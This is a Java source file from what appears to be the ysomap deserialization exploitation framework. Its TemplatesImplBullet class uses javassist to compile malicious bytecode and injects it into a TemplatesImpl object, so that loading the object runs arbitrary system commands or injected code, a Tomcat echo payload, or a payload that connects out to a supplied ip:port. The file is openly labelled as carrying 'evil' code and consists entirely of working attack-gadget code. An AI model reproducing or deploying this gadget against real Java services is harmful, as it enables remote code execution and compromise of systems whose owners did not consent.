package ysomap.bullets.jdk;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import echo.SocketEchoPayload;
import echo.TomcatEchoPayload;
import javassist.*;
import ysomap.bullets.Bullet;
import ysomap.common.annotation.*;
import ysomap.core.util.ClassFiles;
import ysomap.core.util.PayloadHelper;
import ysomap.core.util.ReflectionHelper;

import java.io.IOException;
import java.io.Serializable;

/**
 * @author wh1t3P1g
 * @since 2020/2/17
 */
@SuppressWarnings({"rawtypes"})
@Bullets
@Dependencies({"jdk"})
@Authors({ Authors.WH1T3P1G })
@Details("载入恶意class字节码，并执行任意代码，依赖TemplatesImpl")
public class TemplatesImplBullet implements Bullet<Object> {

    private Class templatesImpl;
    private Class abstractTranslet;
    private Class transformerFactoryImpl;

    @NotNull
    @Require(name = "type", detail = "3种方式（cmd,code,socket）:\n" +
                                "1. cmd，body写入具体的系统命令；\n" +
                                "2. code, body写入具体需要插入执行的代码；\n" +
                                "3. socket, body写入`ip:port`\n")
    private String type = "cmd";

    @NotNull
    @Require(name = "body" ,detail = "evil code body")
    private String body = "";

    @NotNull
    @Require(name = "effect", type = "string", detail="选择载入payload的效果，可选default、TomcatEcho、SocketEcho")
    private String effect = "default";

    @Require(name = "exception", type = "boolean", detail = "是否需要以抛异常的方式返回执行结果，默认为false")
    private String exception = "false";

    public String action = "outputProperties";

    @Override
    public Object getObject() throws Exception {
        if("cmd".equals(type)){
            if("false".equals(exception)){
                body = "java.lang.Runtime.getRuntime().exec(\"" +
                        body.replaceAll("\\\\","\\\\\\\\").replaceAll("\"", "\\\"") +
                        "\");";
            }else{
                body = PayloadHelper.makeExceptionPayload(body);
            }
        }else if("code".equals(type) || "socket".equals(type)){
            // do nothing
        }

        initClazz();
        // create evil bytecodes
        byte[] bytecodes = makeEvilByteCode();
        // arm evil bytecodes
        Object templates = templatesImpl.newInstance();
        // inject class bytes into instance
        ReflectionHelper.setFieldValue(templates, "_bytecodes", new byte[][] { bytecodes });
        ReflectionHelper.setFieldValue(templates, "_name", "Pwnr");
        ReflectionHelper.setFieldValue(templates, "_tfactory", transformerFactoryImpl.newInstance());
        return templates;
    }

    private byte[] makeEvilByteCode() throws NotFoundException, CannotCompileException, IOException {
        ClassPool pool = new ClassPool(true);
        CtClass cc = null;
        if("default".equals(effect)){
            cc = ClassFiles.makeClassFromExistClass(pool,
                    StubTransletPayload.class,
                    new Class<?>[]{abstractTranslet}
            );
            ClassFiles.insertStaticBlock(cc, body);
            ClassFiles.insertSuperClass(pool, cc, abstractTranslet);
        }else if("TomcatEcho".equals(effect)){
            cc = ClassFiles.makeClassFromExistClass(pool,
                    TomcatEchoPayload.class,
                    new Class<?>[]{abstractTranslet}
            );
            ClassFiles.insertSuperClass(pool, cc, abstractTranslet);
        }else if("SocketEcho".equals(effect)){
            String[] remote = body.split(":");
            String code = "host=\""+remote[0]+"\";\nport="+remote[1]+";";
            pool.appendClassPath(new ClassClassPath(SocketEchoPayload.class));
            cc = pool.getCtClass(SocketEchoPayload.class.getName());
            cc.setName("SocketEcho");
            ClassFiles.insertStaticBlock(cc, code);
            ClassFiles.insertSuperClass(pool, cc, abstractTranslet);
        }

        if(cc != null){
            return cc.toBytecode();
        }else{
            return new byte[0];
        }
    }

    private void initClazz() throws ClassNotFoundException {
        if ( Boolean.parseBoolean(System.getProperty("properXalan", "false")) ) {
            templatesImpl = Class.forName("org.apache.xalan.xsltc.trax.TemplatesImpl");
            abstractTranslet = Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet");
            transformerFactoryImpl = Class.forName("org.apache.xalan.xsltc.trax.TransformerFactoryImpl");
        } else {
            templatesImpl = TemplatesImpl.class;
            abstractTranslet = AbstractTranslet.class;
            transformerFactoryImpl = TransformerFactoryImpl.class;
        }
    }

    public static class StubTransletPayload extends AbstractTranslet implements Serializable {

        private static final long serialVersionUID = -5971610431559700674L;

        public void transform (DOM document, SerializationHandler[] handlers ) throws TransletException {}

        @Override
        public void transform (DOM document, DTMAxisIterator iterator, SerializationHandler handler ) throws TransletException {}
    }

}
